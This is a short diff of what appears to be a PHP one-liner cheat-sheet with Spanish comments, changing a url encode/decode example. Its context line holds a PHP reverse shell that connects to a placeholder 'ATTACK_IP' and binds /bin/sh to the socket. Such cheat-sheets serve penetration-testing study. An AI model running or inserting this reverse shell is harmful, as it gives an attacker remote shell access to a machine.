@@ -22,4 +22,8 @@ php -r '$sock=fsockopen("ATTACK_IP",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 # consola interactiva
 php --interactive
-php> echo urldecode("URL ENCODE")
+
+# url encode/decode
+php -r 'echo urldecode("oil+and+gas");'
+php -r 'echo urlencode("oil and gas");'
+
